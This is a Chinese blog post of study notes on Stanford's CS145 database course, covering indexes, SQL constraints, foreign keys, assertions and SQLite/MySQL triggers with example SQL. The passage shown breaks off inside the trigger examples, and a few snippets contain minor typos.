      <title>CS145 Intro to databases 学习笔记4——索引、约束、触发器、事务、视图、授权</title>
      <link href="/2024/02/01/CS145%20Intro%20to%20databases%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04%E2%80%94%E2%80%94%E7%B4%A2%E5%BC%95%E3%80%81%E7%BA%A6%E6%9D%9F%E3%80%81%E8%A7%A6%E5%8F%91%E5%99%A8%E3%80%81%E4%BA%8B%E5%8A%A1%E3%80%81%E8%A7%86%E5%9B%BE%E3%80%81%E6%8E%88%E6%9D%83/"/>
      <url>/2024/02/01/CS145%20Intro%20to%20databases%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04%E2%80%94%E2%80%94%E7%B4%A2%E5%BC%95%E3%80%81%E7%BA%A6%E6%9D%9F%E3%80%81%E8%A7%A6%E5%8F%91%E5%99%A8%E3%80%81%E4%BA%8B%E5%8A%A1%E3%80%81%E8%A7%86%E5%9B%BE%E3%80%81%E6%8E%88%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>已经是学习<strong>standford CS145 Introduction to Databases</strong>系列视频的第四篇笔记，这篇几乎要把SQL中重要的概念都涵盖了。。。</p><p>本文主要包括第十章到第十四章的内容：</p><ol><li>索引</li><li>约束和触发器</li><li>事务</li><li>视图</li><li>授权</li></ol><p>相关参考资料：</p><p>视频链接：<a href="https://www.youtube.com/playlist?list=PLroEs25KGvwzmvIxYHRhoGTz9w8LeXek0">Introduction to Databases - Jennifer Widom - Stanford</a></p><p>黑马的视频也是很实用啊：<a href="https://www.bilibili.com/video/BV1Kr4y1i7ru">黑马程序员 MySQL数据库入门到精通，从mysql安装到mysql高级、mysql优化全囊括</a></p><hr><h1 id="一、索引-Indexes"><a href="#一、索引-Indexes" class="headerlink" title="一、索引(Indexes)"></a>一、索引(Indexes)</h1><h2 id="1-基本介绍"><a href="#1-基本介绍" class="headerlink" title="1. 基本介绍"></a>1. 基本介绍</h2><p>对关系表的某个或某些属性构建<strong>索引</strong>，能够<strong>提高查询的效率</strong>。</p><p>然而，维护索引也需要开销：</p><ul><li>索引需要<strong>占用空间</strong>(最微不足道的开销，空间换时间咱还是愿意的)</li><li><strong>创建索引</strong>需要时间(中等的开销，创建索引确实是耗时的操作)</li><li>索引<strong>需要维护</strong>，特别是在<strong>频繁对数据做修改</strong>时开销很大(几乎可以抵消索引带来的好处)</li></ul><p>因此评价索引需要考虑到<strong>查询</strong>和<strong>修改</strong>的负荷(Query vs. Update)</p><h2 id="2-索引的结构"><a href="#2-索引的结构" class="headerlink" title="2. 索引的结构"></a>2. 索引的结构</h2><p>索引可以有两种结构，分别是：</p><ul><li><strong>B树</strong>或<strong>B+树</strong>(B trees or B+ trees)：可以处理属性的比较关系(=, &lt;, &gt;)，查询的时间复杂度是$O(\log n)$对数级(Logarithmic)</li><li><strong>哈希表</strong>(Hash Tables)：只能处理属性的相等关系(=)，查询的时间复杂度是$O(1)$常数级(Constant)</li></ul><p>因此，只处理相等关系时，尽量用哈希表，需要处理比较关系时可以用B树和B+树</p><h2 id="3-索引的语法"><a href="#3-索引的语法" class="headerlink" title="3. 索引的语法"></a>3. 索引的语法</h2><p><strong>SQL标准</strong>下的索引的语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> Index IndexName <span class="keyword">on</span> T(A) <span class="comment">--对一个属性创建索引</span></span><br><span class="line"><span class="keyword">Create</span> Index IndexName <span class="keyword">on</span> T(Al,A2,..,An) <span class="comment">--对多个属性创建索引</span></span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">Unique</span> Index IndexName <span class="keyword">on</span> T(A)  <span class="comment">--在创建索引的时候检查属性是否有重复值</span></span><br><span class="line"><span class="keyword">Drop</span> Index IndexName <span class="comment">--删除索引</span></span><br></pre></td></tr></table></figure><hr><h1 id="二、约束和触发器-Constraints-and-Triggers"><a href="#二、约束和触发器-Constraints-and-Triggers" class="headerlink" title="二、约束和触发器(Constraints and Triggers)"></a>二、约束和触发器(Constraints and Triggers)</h1><h2 id="1-基本介绍-1"><a href="#1-基本介绍-1" class="headerlink" title="1. 基本介绍"></a>1. 基本介绍</h2><p><strong>(1) 约束和触发器的作用</strong></p><p>约束和触发器，它们都允许我们在处理关系模型时，我们需要对<strong>属性的值的范围作限制</strong>，以及处理<strong>不同属性之间的限制关系</strong></p><p><strong>(2) 约束和触发器的区别</strong></p><p>约束是<strong>静态</strong>的，而触发器是<strong>动态</strong>的。触发器不仅允许监控数据库的状态，而且能够作出即时的反馈，比约束更加expressive和powerful。</p><h2 id="2-约束-Constraints"><a href="#2-约束-Constraints" class="headerlink" title="2. 约束(Constraints)"></a>2. 约束(Constraints)</h2><h3 id="2-1-非空约束-Non-null-Constraints"><a href="#2-1-非空约束-Non-null-Constraints" class="headerlink" title="2.1 非空约束(Non-null Constraints)"></a>2.1 非空约束(Non-null Constraints)</h3><p>添加了非空约束的属性，值不能为NULL<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--在属性后面加上not null添加非空约束</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student(sID <span class="type">int</span>, sName text, GPA <span class="type">real</span> <span class="keyword">not</span> <span class="keyword">null</span>, sizeHS <span class="type">int</span>);</span><br></pre></td></tr></table></figure></p><h3 id="2-2-主键约束和唯一约束-Key-Constraints"><a href="#2-2-主键约束和唯一约束-Key-Constraints" class="headerlink" title="2.2 主键约束和唯一约束(Key Constraints)"></a>2.2 主键约束和唯一约束(Key Constraints)</h3><p>添加了<strong>主键约束</strong>的属性，值不能重复，且<strong>不能为空</strong><br>添加了<strong>唯一约束</strong>的属性，值不能重复，但是<strong>可以为空</strong>(MySQL 允许多个NULL值，其他数据库不清楚)<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--在属性后面加上primary key添加主键约束</span></span><br><span class="line"><span class="comment">--在属性后面加上unique添加唯一约束</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student(sID <span class="type">int</span> <span class="keyword">primary</span> key, sName text <span class="keyword">unique</span></span><br><span class="line">        GPA <span class="type">real</span>, sizeHS <span class="type">int</span>);</span><br></pre></td></tr></table></figure></p><p>可以为多个属性添加Key Constraints</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--将多个属性作为整体添加约束时，放在所有属性的末尾</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Apply(sID <span class="type">int</span>, cName text, major text, decision text</span><br><span class="line">        <span class="keyword">unique</span>(sID, cName), <span class="keyword">unique</span>(sID, major));</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> College(cName text, state text, enrollment <span class="type">int</span>,</span><br><span class="line">        <span class="keyword">primary</span> key(cName, state));</span><br></pre></td></tr></table></figure><h3 id="2-3-基于属性和元组的约束-Attribute-based-Tuple-based-Constraints"><a href="#2-3-基于属性和元组的约束-Attribute-based-Tuple-based-Constraints" class="headerlink" title="2.3 基于属性和元组的约束(Attribute-based/Tuple-based Constraints)"></a>2.3 基于属性和元组的约束(Attribute-based/Tuple-based Constraints)</h3><p>Attribute-based Constraints对属性的值的范围作检查<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--在属性后添加check( condition )限制值的范围</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Student(sID <span class="type">int</span>, sName text,</span><br><span class="line">            GPA <span class="type">real</span> <span class="keyword">check</span>(GPA <span class="operator">&lt;=</span> <span class="number">4.0</span> <span class="keyword">and</span> GPA <span class="operator">&gt;</span> <span class="number">0.0</span>)</span><br><span class="line">            sizeHS <span class="type">int</span> <span class="keyword">check</span>(sizeHS <span class="operator">&lt;</span> <span class="number">5000</span>));</span><br></pre></td></tr></table></figure></p><p>Tuple-based Constraints可以表示多个属性之间的限制关系<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--可以在所有属性的末尾使用check( condition )指定属性间的限制关系</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Apply(sID <span class="type">int</span>, cName text, major text, decision text, </span><br><span class="line">    <span class="keyword">check</span>(decision<span class="operator">=</span><span class="string">&#x27;N&#x27;</span> <span class="keyword">or</span> cName <span class="operator">&lt;&gt;</span> <span class="string">&#x27;Stanford&#x27;</span> <span class="keyword">or</span> major <span class="operator">&lt;&gt;</span> <span class="string">&#x27;CS&#x27;</span>));</span><br></pre></td></tr></table></figure></p><p>事实上，check()可以用来重写许多其他的约束，比如：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--用check重写非空约束</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Student(sID <span class="type">int</span>, sName text, GPA <span class="type">real</span> <span class="keyword">check</span>(GPA <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span>), sizeHS <span class="type">int</span>);</span><br></pre></td></tr></table></figure></p><p>在SQL标准下，check()中编写子查询的有效的，但是实际还没有数据库实现这一功能<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--check()中编写子查询实现外键的引用</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Apply(sID <span class="type">int</span>, cName text, major text, decision text,</span><br><span class="line">    <span class="keyword">check</span>(sID <span class="keyword">in</span>(<span class="keyword">select</span> sID <span class="keyword">from</span> Student)));</span><br></pre></td></tr></table></figure></p><h3 id="2-4-外键约束-Foreign-Key"><a href="#2-4-外键约束-Foreign-Key" class="headerlink" title="2.4 外键约束(Foreign Key)"></a>2.4 外键约束(Foreign Key)</h3><p>视频中也将其叫做引用完整性(Referential integrity)</p><p>表$R$中的属性$A$的值必须在表$S$中的属性$B$中出现，那么：</p><ul><li>称$A$为外键(Foreign Key)，可以有多个属性作为外键</li><li>$B$经常是主键primary key，至少应该是unique的，即不能有重复值</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> College(cName text <span class="keyword">primary</span> key, state text, enrollment <span class="type">int</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Student(sID <span class="type">int</span> <span class="keyword">primary</span> key, sName text, GPA <span class="type">real</span>, sizeHS <span class="type">int</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">--attName references tableName(attName) 设置外键</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Apply(sID <span class="type">int</span> <span class="keyword">references</span> student(sID),</span><br><span class="line">                    cName text <span class="keyword">references</span> College(cName), </span><br><span class="line">                    major text, decision text);</span><br></pre></td></tr></table></figure><p>处理外键约束往往可以归类为两个问题：</p><p><strong>(1) 对$R.A$的修改和更新：需要检查新的值是否在$S.B$中存在</strong></p><p>对于$S.B$中不存在的值，数据库会直接拒绝该修改和更新操作</p><p><strong>(2) 对$S.B$的更新和删除：需要处理引用了旧的值的$R.A$</strong></p><p>处理这一类问题有三个方案：</p><ol><li>CASCADE：级联，对$S.B$更新时将$R.A$一同更新为新的值；对$S.B$删除时将$R.A$的元组一同删除</li><li>SET NULL：在对$S.B$的更新和删除操作时，将引用了旧的值的$R.A$设为NULL</li><li>RESTRICT：<strong>默认</strong>是RESTRICT，当存在引用了旧的值的$R.A$，不允许对$S.B$的更新和删除操作</li></ol><p>实际上，我们可以分别指定更新和删除要用那个方案<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--ON UPDATE &lt;CASCADE/SET NULL/RESTRICT&gt;：指定更新的方案</span></span><br><span class="line"><span class="comment">--ON DELETE &lt;CASCADE/SET NULL/RESTRICT&gt;：指定删除的方案</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Apply(sID <span class="type">int</span> <span class="keyword">references</span> Student(sID) <span class="keyword">on</span> <span class="keyword">delete</span> <span class="keyword">set</span> <span class="keyword">null</span>,</span><br><span class="line">                    cName text <span class="keyword">references</span> College(cName) <span class="keyword">on</span> <span class="keyword">update</span> cascade,</span><br><span class="line">                    decision text, major text);</span><br></pre></td></tr></table></figure></p><h3 id="2-5-通用断言-General-Assertions"><a href="#2-5-通用断言-General-Assertions" class="headerlink" title="2.5 通用断言(General Assertions)"></a>2.5 通用断言(General Assertions)</h3><p>General Assertions目前<strong>只存在于SQL标准</strong>中，未被数据库所实现。</p><p>创建一个断言，它会在我们对数据库就修改时，检查条件是否成立：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--注意!!以下代码仅为解释General Assertions展示, 无法真实执行</span></span><br><span class="line"><span class="comment">--创建一个断言检查表T中属性A是否存在重复值</span></span><br><span class="line"><span class="keyword">create</span> assertion Key</span><br><span class="line"><span class="keyword">check</span>((<span class="keyword">select</span> <span class="built_in">count</span>(<span class="keyword">distinct</span> A) <span class="keyword">from</span> T)</span><br><span class="line">    <span class="operator">=</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>)<span class="keyword">from</span> T)));</span><br><span class="line"></span><br><span class="line"><span class="comment">--创建一个断言检查外键约束</span></span><br><span class="line"><span class="keyword">create</span> assertion ReferentialIntegrity</span><br><span class="line"><span class="keyword">check</span>(<span class="keyword">not</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> Apply</span><br><span class="line">    <span class="keyword">where</span> sID <span class="keyword">not</span> <span class="keyword">in</span>(<span class="keyword">select</span> sID <span class="keyword">from</span> student)));</span><br></pre></td></tr></table></figure><h2 id="3-触发器-Triggers"><a href="#3-触发器-Triggers" class="headerlink" title="3. 触发器(Triggers)"></a>3. 触发器(Triggers)</h2><h3 id="3-1-SQL标准下的触发器"><a href="#3-1-SQL标准下的触发器" class="headerlink" title="3.1 SQL标准下的触发器"></a>3.1 SQL标准下的触发器</h3><p>SQL标准下的触发器语法如下：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">Trigger</span> name             <span class="comment">--创建触发器，为触发器命名</span></span><br><span class="line">Before<span class="operator">|</span>After<span class="operator">|</span>Instead <span class="keyword">of</span> events  <span class="comment">--指定触发器触发的时机，events可以为插入、更新和删除操作</span></span><br><span class="line">[<span class="keyword">referencing</span><span class="operator">-</span>variables]         <span class="comment">--将修改前后的行或表引用为变量</span></span><br><span class="line">[<span class="keyword">For</span> <span class="keyword">Each</span> <span class="type">Row</span>]                  <span class="comment">--指定触发器是Row-Level还是Statement-Level</span></span><br><span class="line"><span class="keyword">When</span> ( <span class="keyword">condition</span> )              <span class="comment">--满足条件时，执行以下动作</span></span><br><span class="line">action</span><br></pre></td></tr></table></figure></p><p><strong>events</strong>可以为插入、更新和删除操作：<br>(1) 插入: Insert on tableName<br>(2) 删除：Delete on tableName<br>(3) 更新：Update [of (attName1, attName2, …)] on tableName</p><p><strong>[referencing-variables]</strong> 可以引用行，也可以引用表：<br>old row as var, new row as var, old table as var, new table as var<br>(1) 对于插入insert操作，只有new<br>(2) 对于删除delete操作，只有old<br>(3) 对于更新update操作，既有old也有new</p><p><strong>[For Each Row]</strong> 有For Each Row表示触发器是行级触发器，否则则是语句级触发器：<br>(1) 行级触发器代表操作有n行，就会执行n次触发器的动作<br>(2) 语句及触发器代表只会在语句末尾执行一次动作<br>需要注意的是，在<strong>SQL标准</strong>中，无论是行级还是语句级，动作都是攒到<strong>语句末尾</strong>执行，而<strong>SQLite和MySQL</strong>的行级触发器都是对<strong>每一行操作即刻时执行</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--示例：R.A引用到S.B，级联删除触发器</span></span><br><span class="line"><span class="comment">--行级触发器写法</span></span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">Trigger</span> Cascade</span><br><span class="line">After <span class="keyword">Delete</span> <span class="keyword">on</span> S</span><br><span class="line"><span class="keyword">Referencing</span> <span class="keyword">Old</span> <span class="type">Row</span> <span class="keyword">As</span> O</span><br><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> <span class="type">Row</span></span><br><span class="line">[ <span class="keyword">no</span> <span class="keyword">condition</span> ]</span><br><span class="line"><span class="keyword">Delete</span> <span class="keyword">From</span> R <span class="keyword">where</span> A <span class="operator">=</span> O.B</span><br><span class="line"></span><br><span class="line"><span class="comment">--语句级触发器写法</span></span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">Trigger</span> Cascade</span><br><span class="line">After <span class="keyword">Delete</span> <span class="keyword">on</span> S</span><br><span class="line"><span class="keyword">Referencing</span> <span class="keyword">Old</span> <span class="keyword">Table</span> <span class="keyword">As</span> OT</span><br><span class="line">[ <span class="keyword">For</span> <span class="keyword">Each</span> <span class="type">Row</span> ]</span><br><span class="line">[ <span class="keyword">no</span> <span class="keyword">condition</span> ]</span><br><span class="line"><span class="keyword">Delete</span> <span class="keyword">From</span> R <span class="keyword">where</span> A <span class="keyword">in</span> (<span class="keyword">select</span> B <span class="keyword">from</span> OT )</span><br></pre></td></tr></table></figure><h3 id="3-2-触发器的语法"><a href="#3-2-触发器的语法" class="headerlink" title="3.2 触发器的语法"></a>3.2 触发器的语法</h3><p>不同的数据库对SQL标准的实现程度不同，在触发器的语法和功能上也有不同：</p><p>Postgre：完全实现了SQL标准，包括行级、语句级触发器，可以引用行，也可以引用表。但是语法更晦涩<br>SQLite：只有行级触发器，且在对<strong>每行操作时就触发</strong><br>MySQL：只有行级触发器，且在对<strong>每行操作时就触发</strong>，且<strong>每个事件只能有一个触发器</strong>，且对<strong>触发器的链式触发有限制</strong></p><blockquote><p>Postgres &gt;</p><ul><li>Expressiveness/behavior = full standard<br>row-level+ statement-level, old/new row &amp; table</li><li>Cumbersome &amp; awkward syntax</li></ul><p>SQLite &gt;&gt;</p><ul><li>Row-level only,immediate activation =&gt; no old/new table</li></ul><p>MySQL</p><ul><li>Row-level only, immediate activation =&gt; no old/new table</li><li>Only one trigger per event type</li><li>Limited trigger chaining</li></ul></blockquote><p><strong>SQLite</strong>和<strong>MySQL</strong>都<strong>预定义了Old、New</strong>两个变量用于引用旧行和新行，并且将动作action编写在begin和end之间的语句块中。</p><p>下面是SQLite的代码示例：</p><h4 id="1-基本操作"><a href="#1-基本操作" class="headerlink" title="(1) 基本操作"></a>(1) 基本操作</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--insert：只有New</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> R1</span><br><span class="line">after <span class="keyword">insert</span> <span class="keyword">on</span> Student </span><br><span class="line"><span class="keyword">for</span> <span class="keyword">each</span> <span class="type">row</span></span><br><span class="line"><span class="keyword">when</span> New.GPA <span class="operator">&gt;</span> <span class="number">3.3</span> <span class="keyword">and</span> New.GPA <span class="operator">&lt;=</span> <span class="number">3.6</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">insert</span> <span class="keyword">into</span> Apply <span class="keyword">values</span>(New.sID, <span class="string">&#x27;Stanford&#x27;</span>, <span class="string">&#x27;geology&#x27;</span>, nu11);</span><br><span class="line">    <span class="keyword">insert</span> <span class="keyword">into</span> Apply <span class="keyword">values</span>(New.sID, <span class="string">&#x27;MIT&#x27;</span>, <span class="string">&#x27;biology&#x27;</span>, nul1);</span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--delete：只有Old</span></span><br><span class="line"><span class="comment">--触发器实现外键的级联删除</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> R2</span><br><span class="line">after <span class="keyword">delete</span> <span class="keyword">on</span> Student</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">each</span> <span class="type">row</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">        <span class="keyword">delete</span> <span class="keyword">from</span> Apply <span class="keyword">where</span> sID <span class="operator">=</span> Old.sID;</span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--update：既有New, 也有Old</span></span><br><span class="line"><span class="comment">--触发器实现外键的级联更新</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> R3</span><br><span class="line">after <span class="keyword">update</span> <span class="keyword">of</span> cName <span class="keyword">on</span> College</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">each</span> <span class="type">row</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">update</span> Apply <span class="keyword">set</span> cName <span class="operator">=</span> New.cName</span><br><span class="line">    <span class="keyword">where</span> cName <span class="operator">=</span> Old.cName;</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure><h4 id="2-拦截错误操作"><a href="#2-拦截错误操作" class="headerlink" title="(2) 拦截错误操作"></a>(2) 拦截错误操作</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--用before events + select raise(ignore)拦截错误的操作</span></span><br><span class="line"><span class="comment">--触发器实现唯一约束(还需要一个before update的触发器就不多赘述了)</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> R4</span><br><span class="line">before <span class="keyword">insert</span> <span class="keyword">on</span> College</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">each</span> <span class="type">row</span></span><br><span class="line"><span class="keyword">when</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> College <span class="keyword">where</span> cName <span class="operator">=</span> New.cName)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">select</span> raise(ignore);</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure><h4 id="3-实现复杂操作"><a href="#3-实现复杂操作" class="headerlink" title="(3) 实现复杂操作"></a>(3) 实现复杂操作</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--触发器能够实现约束不能实现的东西</span></span><br><span class="line"><span class="comment">--比如check中不能编写子查询和聚合函数，和General Assertions不被数据库支持的问题</span></span><br><span class="line"><span class="comment">--我们用when + select语句来监控并采取action</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> R6</span><br><span class="line">after <span class="keyword">insert</span> <span class="keyword">on</span> Apply</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">each</span> <span class="type">row</span></span><br><span class="line"><span class="keyword">when</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> Apply <span class="keyword">where</span> cName <span class="operator">=</span> New.cName) <span class="operator">&gt;</span> <span class="number">10</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">update</span> College <span class="keyword">set</span> cName <span class="operator">=</span> cName <span class="operator">||</span> &quot;-Done&quot;  <span class="comment">-- ||运算符表示连接两个字符串</span></span><br><span class="line">    <span class="keyword">where</span> cName <span class="operator">=</span> New.cName;</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure><h4 id="4-递归调用"><a href="#4-递归调用" class="headerlink" title="(4) 递归调用"></a>(4) 递归调用</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--默认情况下，SQLite要求触发器不能被递归调用，</span></span><br><span class="line"><span class="comment">--也就是说，一个事件的触发器在一次操作中只能触发一次</span></span><br><span class="line"><span class="comment">--下列语句将允许触发器的递归调用</span></span><br><span class="line">PRAGMA recursive_triggers <span class="operator">=</span> <span class="keyword">on</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--一个或多个触发器互相调用时，需要有终止条件防止死循环</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> R1</span><br><span class="line">after <span class="keyword">insert</span> <span class="keyword">on</span> T1</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">each</span> <span class="type">row</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">insert</span> <span class="keyword">into</span> T2 <span class="keyword">values</span>(New.A <span class="operator">+</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> R2</span><br><span class="line">after <span class="keyword">insert</span> <span class="keyword">on</span> T2</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">each</span> <span class="type">row</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">insert</span> <span class="keyword">into</span> T3 <span class="keyword">values</span>(New.A <span class="operator">+</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> R3</span><br><span class="line">after <span class="keyword">insert</span> <span class="keyword">on</span> T3</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">each</span> <span class="type">row</span></span><br><span class="line"><span class="comment">--设置终止条件防止死循环</span></span><br><span class="line"><span class="keyword">when</span> <span class="keyword">select</span>(<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> T1) <span class="operator">&lt;</span> <span class="number">100</span> </span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">insert</span> <span class="keyword">into</span> T1 <span class="keyword">values</span>(New.A <span class="operator">+</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure><h4 id="5-同个事件多个触发器的执行顺序"><a href="#5-同个事件多个触发器的执行顺序" class="headerlink" title="(5) 同个事件多个触发器的执行顺序"></a>(5) 同个事件多个触发器的执行顺序</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 